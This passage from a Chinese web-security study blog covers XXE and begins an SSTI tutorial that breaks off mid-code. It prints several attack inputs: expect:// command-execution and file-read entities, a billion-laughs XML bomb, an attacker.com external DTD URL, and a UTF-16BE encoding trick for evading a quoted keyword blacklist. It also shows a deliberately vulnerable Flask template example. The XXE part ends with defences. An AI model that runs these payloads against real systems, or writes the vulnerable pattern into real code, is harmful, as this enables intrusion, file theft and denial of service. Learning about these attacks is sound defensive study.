class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>52<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>bar<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>在php环境下，xml命令执行需要php装有expect扩展，但该扩展默认没有安装，所以一般来说命令执行是比较难利用，但不排除。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-variable">$xml</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span></span><br><span class="hljs-string"><span class="language-php">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;except://ls&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span></span><br><span class="language-xml">EOF;</span><br><span class="language-xml">$data = simplexml_load_string($xml);</span><br><span class="language-xml">print_r($data);</span><br><span class="language-xml">?&gt;</span><br></code></pre></td></tr></table></figure><p>paylaod：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">name</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://ifconfig&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h3><p>常见的XML炸弹：当XML解析器尝试解析该文件时，由于DTD的定义指数级展开，这个1K不到的文件会占用到3G的内存。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE lolz [<br>&lt;!ENTITY lol &quot;lol&quot;&gt;<br>&lt;!ENTITY lol2 &quot;<span class="hljs-literal">&amp;lol;</span><span class="hljs-literal">&amp;lol;</span><span class="hljs-literal">&amp;lol;</span><span class="hljs-literal">&amp;lol;</span><span class="hljs-literal">&amp;lol;</span><span class="hljs-literal">&amp;lol;</span><span class="hljs-literal">&amp;lol;</span><span class="hljs-literal">&amp;lol;</span><span class="hljs-literal">&amp;lol;</span><span class="hljs-literal">&amp;lol;</span>&quot;&gt;<br>&lt;!ENTITY lol3 &quot;<span class="hljs-literal">&amp;lol2;</span><span class="hljs-literal">&amp;lol2;</span><span class="hljs-literal">&amp;lol2;</span><span class="hljs-literal">&amp;lol2;</span><span class="hljs-literal">&amp;lol2;</span><span class="hljs-literal">&amp;lol2;</span><span class="hljs-literal">&amp;lol2;</span><span class="hljs-literal">&amp;lol2;</span><span class="hljs-literal">&amp;lol2;</span><span class="hljs-literal">&amp;lol2;</span>&quot;&gt;<br>&lt;!ENTITY lol4 &quot;<span class="hljs-literal">&amp;lol3;</span><span class="hljs-literal">&amp;lol3;</span><span class="hljs-literal">&amp;lol3;</span><span class="hljs-literal">&amp;lol3;</span><span class="hljs-literal">&amp;lol3;</span><span class="hljs-literal">&amp;lol3;</span><span class="hljs-literal">&amp;lol3;</span><span class="hljs-literal">&amp;lol3;</span><span class="hljs-literal">&amp;lol3;</span><span class="hljs-literal">&amp;lol3;</span>&quot;&gt;<br>&lt;!ENTITY lol5 &quot;<span class="hljs-literal">&amp;lol4;</span><span class="hljs-literal">&amp;lol4;</span><span class="hljs-literal">&amp;lol4;</span><span class="hljs-literal">&amp;lol4;</span><span class="hljs-literal">&amp;lol4;</span><span class="hljs-literal">&amp;lol4;</span><span class="hljs-literal">&amp;lol4;</span><span class="hljs-literal">&amp;lol4;</span><span class="hljs-literal">&amp;lol4;</span><span class="hljs-literal">&amp;lol4;</span>&quot;&gt;<br>&lt;!ENTITY lol6 &quot;<span class="hljs-literal">&amp;lol5;</span><span class="hljs-literal">&amp;lol5;</span><span class="hljs-literal">&amp;lol5;</span><span class="hljs-literal">&amp;lol5;</span><span class="hljs-literal">&amp;lol5;</span><span class="hljs-literal">&amp;lol5;</span><span class="hljs-literal">&amp;lol5;</span><span class="hljs-literal">&amp;lol5;</span><span class="hljs-literal">&amp;lol5;</span><span class="hljs-literal">&amp;lol5;</span>&quot;&gt;<br>&lt;!ENTITY lol7 &quot;<span class="hljs-literal">&amp;lol6;</span><span class="hljs-literal">&amp;lol6;</span><span class="hljs-literal">&amp;lol6;</span><span class="hljs-literal">&amp;lol6;</span><span class="hljs-literal">&amp;lol6;</span><span class="hljs-literal">&amp;lol6;</span><span class="hljs-literal">&amp;lol6;</span><span class="hljs-literal">&amp;lol6;</span><span class="hljs-literal">&amp;lol6;</span><span class="hljs-literal">&amp;lol6;</span>&quot;&gt;<br>&lt;!ENTITY lol8 &quot;<span class="hljs-literal">&amp;lol7;</span><span class="hljs-literal">&amp;lol7;</span><span class="hljs-literal">&amp;lol7;</span><span class="hljs-literal">&amp;lol7;</span><span class="hljs-literal">&amp;lol7;</span><span class="hljs-literal">&amp;lol7;</span><span class="hljs-literal">&amp;lol7;</span><span class="hljs-literal">&amp;lol7;</span><span class="hljs-literal">&amp;lol7;</span><span class="hljs-literal">&amp;lol7;</span>&quot;&gt;<br>&lt;!ENTITY lol9 &quot;<span class="hljs-literal">&amp;lol8;</span><span class="hljs-literal">&amp;lol8;</span><span class="hljs-literal">&amp;lol8;</span><span class="hljs-literal">&amp;lol8;</span><span class="hljs-literal">&amp;lol8;</span><span class="hljs-literal">&amp;lol8;</span><span class="hljs-literal">&amp;lol8;</span><span class="hljs-literal">&amp;lol8;</span><span class="hljs-literal">&amp;lol8;</span><span class="hljs-literal">&amp;lol8;</span>&quot;&gt;<br>]&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">lolz</span>&gt;</span></span><span class="hljs-literal">&amp;lol9;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">lolz</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><h3 id="Java相关XXE"><a href="#Java相关XXE" class="headerlink" title="Java相关XXE"></a>Java相关XXE</h3><p>Java 中的 XXE 除了常规利⽤⽅式之外, 还有着其它的特点</p><p>例如可以通过 file:&#x2F;&#x2F; 或 netdoc:&#x2F;&#x2F; 协议列⽬录, 读取⽂件</p><p>除了利⽤ file 和 netdoc 协议列⽬录外, Java 中的 XXE 还可以利⽤ jar 协议上 传⽂件, 在某些情况下可以配合其它漏洞组合利⽤ </p><p>jar:&#x2F;&#x2F; 能够从远程获取 jar ⽂件, 然后将其中的内容进⾏解压并读取⽂件内容, 格 式如下 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">jar:http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/test.jar!/</span>path<span class="hljs-regexp">/to/</span>file<span class="hljs-regexp">/in/</span>zip <br></code></pre></td></tr></table></figure><p>在获取 jar 的过程中, Java 会将 jar&#x2F;zip ⽂件作为临时⽂件保存在 &#x2F;tmp ⽬录 (或其它路 径) 下, 然后获取压缩包内对应⽂件的内容, 最后将临时⽂件删除</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>我们可以利用不同的协议</p><table><thead><tr><th>协议</th><th>使用方式</th></tr></thead><tbody><tr><td>file</td><td><code>file:///etc//passwd</code></td></tr><tr><td>php</td><td><code>php://filter/read=convert.base64-encode/resource=index.php</code></td></tr><tr><td>http</td><td><code>http://attacker.com/evil.dtd</code></td></tr></tbody></table><p>前面我们已经提到不同语言能使用的协议了，这里就不详解了</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>过滤如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">blacklist</span> = [<span class="hljs-string">&#x27;&lt;!ENTITY&#x27;</span>,<span class="hljs-string">&#x27;PUBLIC&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM&#x27;</span>,<span class="hljs-string">&#x27;&lt;![CDATA[&#x27;</span>,<span class="hljs-string">&#x27;file://&#x27;</span>,<span class="hljs-string">&#x27;http://&#x27;</span>,<span class="hljs-string">&#x27;https://&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>]<br></code></pre></td></tr></table></figure><p>但是⼤多数的 XML 解析器都⽀持多种编码, 例如 UTF-16 (UTF-16-BE, UTF-16-LE) 等, 并且存在不同的解析特点</p><p>以 libxml2 为例 (Python 的 lxml 库基于 libxml2), 它会在读取 XML 头的 encoding 字段之后⽴即更改编码, 然后再进⾏解析 </p><p>我们可以通过 UTF-8 和 UTF-16BE 混合编码的⽅式, 让 libxml2 能够 正常解析 XML, 同时⼜不会触发 WAF 的规则 </p><p>构造⽅式如下</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">echo -<span class="hljs-keyword">n</span> &#x27;&lt;?xml <span class="hljs-keyword">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-16BE&quot;</span>&#x27; &gt; encodingxxe.xml<br><span class="hljs-keyword">cat</span> <span class="hljs-keyword">test</span>.xml| iconv -f UTF-8 -t UTF-16BE &gt;&gt; encodingxxe.xml<br></code></pre></td></tr></table></figure><p>test.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">?&gt;<span class="hljs-meta">&lt;!DOCTYPE<span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注意不能使⽤ burp, 因为 burp 会⾃动对编码进⾏转换</p><p>使⽤ python 脚本发送数据包</p><h2 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a>XXE漏洞防御</h2><p><strong>1、使用开发语言提供的禁用外部实体的方法</strong><br>php:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">true</span></span>);</span><br></code></pre></td></tr></table></figure><p>java:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">DocumentBuilderFactory dbf <span class="hljs-operator">=</span>DocumentBuilderFactory.newInstance()<span class="hljs-comment">;</span><br>dbf.setExpandEntityReferences(false)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>Python:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="hljs-attribute">resolve_entities</span>=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure><p><strong>2、过滤用户提交的XML数据</strong></p><p>过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。<br><strong>3、不允许XML中含有自己定义的DTD</strong></p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://xz.aliyun.com/news/2994">一篇文章带你深入理解漏洞之 XXE 漏洞-先知社区</a></p><p><a href="https://xz.aliyun.com/news/6483">从XML相关一步一步到XXE漏洞-先知社区</a></p><p><a href="https://www.cnblogs.com/websecurity-study/p/11348913.html">WEB安全——XML注入 - 灰羽· - 博客园</a></p><p><a href="https://xz.aliyun.com/news/24">【译】XSLT attack-先知社区</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI学习总结</title>
    <link href="/2025/07/13/SSTI%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/07/13/SSTI%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p><strong>什么是模板？</strong></p><p>模板可以被认为是一段固定好格式，等着开发人员或者用户来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容易、清楚且相对安全地编写前后端不同的逻辑。</p><p><strong>什么是模板引擎？</strong></p><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p><p>不同语言有不同的模板引擎，比如：</p><ul><li><strong>Python</strong>：Jinja2, Mako, Django Template</li><li><strong>Java</strong>：Freemarker, Velocity</li><li><strong>PHP</strong>：Smarty, Twig</li><li><strong>Node.js</strong>：EJS, Pug, Handlebars</li></ul><p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p><p>简单来说，模板是一种包含静态内容和动态占位符（变量、表达式、逻辑语句等）的文件或字符串。模板引擎是一种程序或库，用于解析模板，把变量、表达式等替换为实际的数据，最终输出结果内容。</p><p>模板引擎需要配合模板一起使用，才能实现动态内容生成。</p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p><p>当前使用的一些框架，比如python的flask、php的thinkphp、java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p>模板注入 ———— 接下来都用 SSTI 代替它，SSTI 存在于 MVC 模式当中的 View 层；M 为 Model 数据层，V 为 View 视图层；C 为 Controller 控制层。而 SSTI 就存在于 View 视图层当中。</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web  应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p><p><strong>SSTI漏洞原理</strong></p><p>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。</p><h1 id="python-SSTI"><a href="#python-SSTI" class="headerlink" title="python SSTI"></a>python SSTI</h1><h2 id="flask与Jinja2"><a href="#flask与Jinja2" class="headerlink" title="flask与Jinja2"></a>flask与Jinja2</h2><p><strong>Flask</strong>是一个使用Python编写的轻量级Web应用框架。</p><p>其WSGI工具箱采用Werkzeug，模板引擎则使用<strong>Jinja2</strong>。Flask使用BSD授权。</p><p>Flask的特点有：良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、集成支持单元测试、RESTful请求调度、支持安全cookies、基于Unicode。</p><p>Python可直接用flask启动一个web服务页面。</p><p><strong>Jinja2</strong>是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的；Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了 <code>&#123;&#123;…&#125;&#125;</code> 块；Jinja2使用 <code>&#123;&#123;name&#125;&#125;</code>结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p><p>Jinja2 模板同样支持控制语句，像在 <code>&#123;%…%&#125;</code> 块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子：</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">     </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> comment <span class="hljs-keyword">in</span> comments %&#125;</span><span class="language-xml"></span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;comment&#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">     </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">Hello, </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>|capitalize&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>模板渲染函数</strong></p><p>这里主要有两种模板渲染函数：</p><p><code>render_template_string()</code>与<code>render_template()</code>，其中render_template是用来渲染一个指定文件的，render_template_string()则是用来渲染字符串的。</p><p>而渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即：<code>&#123;&#123;&#125;&#125;</code>在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把<code>&#123;&#123;&#125;&#125;</code>包裹的内容当做变量解析替换。比如<code>&#123;&#123;2*2&#125;&#125;</code>会被解析成4。因此才有了现在的模板注入漏洞。往往变量我们使用<code>&#123;&#123;恶意代码&#125;&#125;</code>。正因为<code>&#123;&#123;&#125;&#125;</code>包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞。</p><p><strong>漏洞演示</strong></p><p>下面我们用flask演示一下漏洞。</p><p>正常的代码：</p><p>GET方式获取ben的值，赋值给str，str值通过render_template_string加载到body中间，str是被<code>&#123;&#123;&#125;&#125;</code>包括起来的，会被预先渲染转义，然后才输出，不会被渲染执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br>app = Flask(name)<br><span class="hljs-meta">@app.route(<span class="hljs-params">‘/’,methods=[‘GET’]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br><span class="hljs-built_in">str</span> = request.args.get(‘ben’)<br>html_str = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;head&gt;&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;&#123;&#123;str&#125;&#125;&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">return</span> render_template_string(html_str,<span class="hljs-built_in">str</span>=<span class="hljs-built_in">str</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">True</span><br>    app.run(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-string">&#x27;8080&#x27;</span>)<br></code></pre></td></tr></table></figure><p>有漏洞的代码：</p><p>str值通过format()函数填充到body中间，<code>&#123;&#125;</code>里可以定义任何参数，return render_template_string会把<code>&#123;&#125;</code>内的字符串当成代码指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> importlib.resources <span class="hljs-keyword">import</span> contents<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-built_in">str</span> = request.args.get(<span class="hljs-string">&#x27;ben&#x27;</span>)<br>    html_str = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;html&gt;</span><br><span class="hljs-string">    &lt;head&gt;&lt;/head&gt;</span><br><span class="hljs-string">    &lt;body&gt;&#123;&#125;&lt;/body&gt;</span><br><span class="hljs-string">    &lt;/html&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(html_str)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">True</span><br>    app.run(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-string">&#x27;8080&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>漏洞判断</strong></p><p>Jinja2只是模板引擎之一，我们可以基于以下方法判断SSTI类型</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507140013557.png" alt="image-20250712215857446"></p><table><thead><tr><th>名称</th><th>语言</th><th>特点</th><th>示例语法</th></tr></thead><tbody><tr><td>Smarty</td><td>PHP</td><td>经典、成熟</td><td><code>&#123;$name&#125;</code></td></tr><tr><td>Mako</td><td>Python</td><td>灵活、表达力强</td><td><code>$&#123;name&#125;</code></td></tr><tr><td>Jinja2</td><td>Python</td><td>现代、功能全面</td><td><code>&#123;&#123; name &#125;&#125;</code></td></tr><tr><td>Twig</td><td>PHP</td><td>现代、易用、安全</td><td><code>&#123;&#123; name &#125;&#125;</code></td></tr></tbody></table><h2 id="python继承关系和魔术方法"><a href="#python继承关系和魔术方法" class="headerlink" title="python继承关系和魔术方法"></a>python继承关系和魔术方法</h2><p><strong>继承</strong>是面向对象编程中的一个重要特性。子类可以继承父类的属性和方法，并可以扩展或重写父类的方法。</p><ul><li><strong>父类（基类、超类）</strong>：被继承的类，object 是父子关系的顶端，所有数据类型最终的父类都是 object</li><li><strong>子类（派生类）</strong>：继承父类的类，注意：子类可以调用父类下的其他子类</li></ul><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507140014647.png" alt="image-20250712223554313"></p><ul><li><strong>object</strong>：所有类最终都继承自 object，是 Python 类体系的顶端。</li><li><strong>classA</strong>：object 的子类。</li><li><strong>classB</strong>：object 的子类，拥有 Eval 函数。</li><li>我们可以通过 classA到object，再到classB，获得Eval函数</li></ul><p>魔术方法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">__class__         # 查找当前类型的所属对象  <br>__base__          # 沿着父子类的关系往上走一个  <br>__mro__           # 查找当前类对象的所有继承类  <br>__subclasses__()  # 查找父类下的所有子类  <br>__getitem__       # 对数组字典的内容提取<br>__init__          # 查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现<span class="hljs-keyword">wrapper</span>字眼，说明没有重载  <br>__globals__       # 函数会以字典的形式返回当前对象的全部全局变量<br>__dict__　　       # 保存类实例或对象实例的属性变量键值对字典<br>__builtins__      # 提供对Python的所有&quot;内置&quot;标识符的直接访问,即先加载内嵌函数再调用<br>__import__        # 动态加载类和函数，用于导入模块，经常用于导入os模块（例如__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).<span class="hljs-keyword">read</span>()）<br></code></pre></td></tr></table></figure><p>下面我们以代码为例，进行理解（主要弄懂前四个魔术方法）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>: <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>(<span class="hljs-title class_ 